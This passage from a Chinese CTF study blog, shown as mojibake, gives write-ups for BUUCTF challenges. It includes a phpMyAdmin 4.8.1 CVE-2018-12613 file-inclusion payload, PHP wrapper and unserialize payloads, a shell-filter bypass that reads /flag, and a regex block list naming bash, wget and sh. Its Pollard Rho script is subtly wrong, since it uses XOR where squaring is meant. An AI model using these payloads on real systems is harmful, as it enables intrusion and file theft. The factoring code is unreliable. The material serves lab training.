<h1 id="Aliceä¸Bob"><a href="#Aliceä¸Bob" class="headerlink" title="Aliceä¸Bob"></a>Aliceä¸Bob</h1><p>å¯†ç å­¦å†å²ä¸­ï¼Œæœ‰ä¸¤ä½çŸ¥åçš„æ°å‡ºäººç‰©ï¼ŒAliceå’ŒBobã€‚ä»–ä»¬çš„çˆ±æƒ…ç»è¿‡ç½®æ¢å’Œè½®åŠ å¯†ä¹Ÿéš¾ä»¥æ··æ·†ï¼Œå³ä½¿æ˜¯æ²¡æœ‰èº«ä»½è®¤è¯ä¹Ÿå¯ä»¥çŸ¥æ ¹çŸ¥åº•ã€‚å°±åƒåœ¨æ•°å­¦ç‹å›½ä¸­çš„ç´ æ•°ä¸€æ ·ï¼Œå­¤å‚²åˆçƒ­æƒ…ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¤§æ•´æ•°: <code>98554799767</code> ,è¯·åˆ†è§£ä¸ºä¸¤ä¸ªç´ æ•°ï¼Œåˆ†è§£åï¼Œå°çš„æ”¾å‰é¢ï¼Œå¤§çš„æ”¾åé¢ï¼Œåˆæˆä¸€ä¸ªæ–°çš„æ•°å­—ï¼Œè¿›è¡Œmd5çš„32ä½å°å†™å“ˆå¸Œï¼Œæäº¤ç­”æ¡ˆã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/The__Apollo/article/details/80279716" target="_blank" rel="noopener">ç®€è¿°å¤§æ•°åˆ†è§£ç®—æ³•Pollard Rhoå’ŒPollard p-1</a><br><a href="https://blog.csdn.net/weixin_42251364/article/details/95462358" target="_blank" rel="noopener">å› æ•°åˆ†è§£â€”â€”Pollardâ€™ p-1 &amp; Pollard rho</a></p>
<h2 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PollardRho</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    xi = randint(<span class="number">0</span>,n<span class="number">-1</span>);  </span><br><span class="line">    <span class="comment"># åœ¨èŒƒå›´å†…éšæœºç”Ÿæˆä¸€ä¸ªæ•°</span></span><br><span class="line">    </span><br><span class="line">    k = <span class="number">2</span></span><br><span class="line">    y = xi</span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        xi = ((xi^<span class="number">2</span>)<span class="number">-1</span>) % n</span><br><span class="line">        <span class="comment"># xi ä¸2 (äºŒè¿›åˆ¶)å¼‚æˆ–å‡1 ç„¶åé™¤ n æ±‚ä½™æ•° </span></span><br><span class="line">        <span class="comment"># 1^1=0   0^0=0    1^0=1</span></span><br><span class="line">        </span><br><span class="line">        d = gcd(y-xi,n)  </span><br><span class="line">        <span class="comment"># æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æœ€å¤§å…¬çº¦æ•°</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span> <span class="keyword">and</span> d !=n:</span><br><span class="line">            print(d)</span><br><span class="line">            <span class="keyword">if</span> i == k:</span><br><span class="line">                y = xi</span><br><span class="line">                k = <span class="number">2</span>*k</span><br><span class="line"></span><br><span class="line">PollardRho(<span class="number">98554799767</span>)</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="æ—¥å¸¸çæ‰¯"><a href="#æ—¥å¸¸çæ‰¯" class="headerlink" title="æ—¥å¸¸çæ‰¯"></a>æ—¥å¸¸çæ‰¯</h1><p>æœ¬æ¥è¿˜è¯´è¦å¤šçœ‹ä¸€ç‚¹ï¼Œç»“æœä»Šå¤©æ„Ÿè§‰è‡ªå·±ä¸åœ¨çŠ¶æ€ã€‚ å¥½å¥½ä¼‘æ•´ï¼Œç­‰ä¸€ä¸‹çœ‹å…¶ä»–ä¸œè¥¿ç®—äº†ï¼Œå‘†åœ¨å®¶é‡Œå…³ä¹…äº†ï¼Œå…¶å®è¿˜æ˜¯æœ‰ç‚¹çƒ¦çš„ï¼Œæ„Ÿè§‰æŒºå½±å“è‡ªå·±æƒ…ç»ªå’ŒçŠ¶æ€ï¼Œæ‰‹å¤´è¿˜æœ‰äº›ä¸œè¥¿æ²¡çœ‹ï¼Œä¸»è¦æ˜¯æ¯å¤©çœ‹æ•°å­¦è¦èŠ±è´¹å¤ªå¤šæ—¶é—´äº†ï¼Œæœ€è¿‘aé¢˜ä¹Ÿæ²¡ä»€ä¹ˆæ—¶é—´ï¼Œä¹Ÿæ²¡æ—¶é—´å»çœ‹äº›æ¼æ´ï¼Œå­¦äº›å§¿åŠ¿ï¼Œæ…¢æ…¢æ¥å§ï¼Œè™½ç„¶ä¸èƒ½åƒå‰é¢é‚£æ ·æ¯å¤©èŠ±æ—¶é—´å»aé¢˜ï¼Œå»å­¦æŠ€æœ¯ï¼Œä½†è¿˜æ˜¯æŠ“ç´§æ—¶é—´å­¦ä¹ å§ï¼Œç°åœ¨çš„ä¸»è¦ç›®æ ‡æ˜¯å‡†å¤‡è€ƒç ”ï¼ˆè€ƒä¸Šäº†èµ·ç è¿˜èƒ½å¤š2å¹´æ‘¸é±¼è†œå¤§ä½¬çš„æ—¶é—´</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
        <tag>å¯†ç å­¦</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay8</title>
    <url>/yakko117/2020/02/09/Buuctfday8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1><p>æ‰«åå°åªæ‰«åˆ°äº† <code>robots.txt</code><br>ç„¶åå¾—åˆ°äº† <code>phpinfo.php</code>ï¼ŒæŸ¥çœ‹ä¿¡æ¯<br>çœ‹åˆ°äº†3306ç«¯å£å¼€ç€ï¼Œæ ¹æ®é¢˜æ„æ¨æ–­å­˜åœ¨ <code>phpmyadmin</code><br>ç„¶åæ‰¾åˆ°è·¯å¾„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node3.buuoj.cn&#x2F;phpmyadmin&#x2F;index.php</span><br></pre></td></tr></table></figure></div>

<p>æ˜¾ç¤º <code>phpMyAdminç‰ˆæœ¬ä¿¡æ¯ï¼š4.8.1</code> ç½‘ä¸Šæ‰¾åˆ°ä¸ª <code>CVE-2018-12613</code><br><code>PhpMyadminåå°æ–‡ä»¶åŒ…å«</code>ï¼Œç„¶åæäº¤å¦‚ä¸‹Payloadï¼Œå›æ˜¾å¾—åˆ° <code>flag</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>å¼€é—¨è§å±±ï¼Œé¢˜ç›®è¿˜ç®—ç®€å•</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))</span><br></pre></td></tr></table></figure></div>

<p>éœ€è¦POST <code>$text</code> ä¸º <code>welcome to the zjctf</code> æ‰èƒ½è¿›è¡Œåé¢çš„æ­¥éª¤<br>è¿™é‡Œç”¨ä¼ªåè®®åœ¨ä»¥POSTå½¢å¼ä¼ å…¥ <code>welcome to the zjctf</code><br>ç»•è¿‡å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br><span class="line"></span><br><span class="line">base64 ç»•è¿‡è¿‡æ»¤ï¼Œå½“ç„¶ï¼Œè¿™é‡Œæ²¡è¿‡æ»¤å­—ç¬¦ï¼Œä¸åŠ å¯†ä¹Ÿèƒ½æ‰§è¡Œ</span><br><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åçœ‹åˆ°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br></pre></td></tr></table></figure></div>

<p>æ­£åˆ™è¿‡æ»¤æ‰<code>flag</code>ï¼Œæç¤ºä¸€ä¸ª <code>useless.php</code> ç”¨<code>php://filter</code> è¯»æ–‡ä»¶<br>Payload å¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°çš„base64çš„å­—ç¬¦ä¸²è§£ç å°±æ˜¯ <code>useless.php</code></p>
<h2 id="Useless-php"><a href="#Useless-php" class="headerlink" title="Useless.php"></a>Useless.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ç®€å•çš„ååºåˆ—åŒ–æ„é€ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line">$password=<span class="keyword">new</span> Flag();</span><br><span class="line">$password = serialize($password);</span><br><span class="line"><span class="keyword">echo</span> $password; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ° <code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p>ç„¶åç»“åˆä¸Šé¢çš„æ„é€ æäº¤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure></div>

<p>å›æ˜¾æŸ¥çœ‹æºç å¾—åˆ° flag</p>
<hr>
<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>å‚è€ƒé“¾æ¥å¦‚ä¸‹<br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/" target="_blank" rel="noopener">Unicodeç­‰ä»·æ€§æµ…è°ˆ</a><br><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">æµ…è°ˆUnicodeè®¾è®¡çš„å®‰å…¨æ€§</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuzhu0j30sl0ewwfs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuzhu0j30sl0ewwfs.jpg" class="lazyload" title="test"></a></p>
<p>å¦‚å›¾ï¼Œè¯´æœ‰4æ¡ç‹¬è§’å…½å¯ä»¥å»ä¹°ï¼Œç„¶åæ˜¾ç¤ºäº†åºå·å’Œä»·æ ¼ï¼Œé€‰æ‹©å“ªä¸ªå°±è¾“å…¥ä»·æ ¼å°±å¥½äº†ï¼Œç„¶åç‚¹ <code>Purchase Unicorn</code>ï¼Œè®©æˆ‘æƒ³èµ·äº†ä»¥å‰çš„åšè¿‡çš„é¢˜ç›®ï¼Œä½†è¿™æ¬¡ä¸æ˜¯ <code>unicode</code> æ¬ºéª—ï¼Œæ˜¯åˆ©ç”¨<code>Unicodeæ„é€ ç­‰ä»·å­—ç¬¦</code>ï¼Œå€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œè¾“å…¥2ä½ä»¥ä¸Š æˆ–è€… æµ®ç‚¹å‹å°±ä¼šæŠ¥é”™</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuy4vmj309r05p746.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuy4vmj309r05p746.jpg" class="lazyload" title="test"></a></p>
<p>çœ‹è¿™ä¸ªæ ·å­å°±æ˜¯ä¹°ç¬¬å››ä¸ªç‹¬è§’å…½ï¼Œç„¶åå›æ˜¾flag</p>
<p>ç„¶ååœ¨<a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">è¿™ä¸ªç½‘ç«™</a>æ‰¾åˆ°äº†</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuyujqj30tn0i0t9j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuyujqj30tn0i0t9j.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åæäº¤åˆ°ä¹‹åï¼Œå°±å›æ˜¾flagäº†</p>
<hr>
<h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h1><p>é¢˜ç›®çš„URL è®©æˆ‘æƒ³åˆ°äº†<a href="https://www.suk1.top/2019/04/18/DDctf2019/#Web-01-%E6%BB%B4" target="_blank" rel="noopener">å¼Ÿå¼Ÿå¹å¤´å‘çš„é¢˜ç›®</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br><span class="line">ç„¶åå°†ä¸­é—´é‚£æ®µè§£ç </span><br><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0&#x3D;</span><br></pre></td></tr></table></figure></div>

<p>ç»è¿‡ <code>base64 -&gt; base64 -&gt; hex</code> å¾—åˆ°äº† <code>555.png</code><br>å› æ­¤æˆ‘ä»¬å°è¯•é€†æ¨ï¼Œå°† <code>index.php</code> è½¬æ¢æˆ <code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code><br>ç„¶åæäº¤åˆ°URLï¼Œå¾—åˆ° <code>index.php</code> çš„æºç </p>
<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæŸ¥çœ‹æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">"/flag/i"</span>, $file)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)</span><br></pre></td></tr></table></figure></div>

<p>æ­£åˆ™é™åˆ¶è®¸å¤šï¼Œä½†æ˜¯å‚è€ƒå¾®ç¬‘å¸ˆå‚…ä»¥å‰å†™çš„<a href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">å‘½ä»¤æ³¨å…¥ç»•è¿‡</a>ï¼Œç»“åˆå‰å‡ å¤©çœ‹çš„<code>CVE-2014-6271</code>ï¼Œæ„é€ å¦‚ä¸‹payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;c\at%20&#x2F;flag</span><br></pre></td></tr></table></figure></div>

<p>å­˜åœ¨md5ç¢°æ’</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br></pre></td></tr></table></figure></div>

<p>ç»•è¿‡æ–¹æ³•å‚è€ƒ <a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener">CTFä¸­å¸¸è§php-MD5()å‡½æ•°æ¼æ´</a></p>
<p>ç„¶åç”¨ <code>dir</code> æŸ¥çœ‹çš„æ—¶å€™ï¼Œå‘ç° <code>flag</code> ä¸åœ¨è¿™ä¸€ç›®å½•ï¼›</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv00xej314t0i7qaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv00xej314t0i7qaa.jpg" class="lazyload" title="test"></a></p>
<p>è·³è½¬åˆ°ä¸Šä¸€å±‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv2swwj316b0hcahm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv2swwj316b0hcahm.jpg" class="lazyload" title="test"></a></p>
<p>æœ€åæ„é€ Payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?cmd=/bin/c\at%20/flag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 393</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span 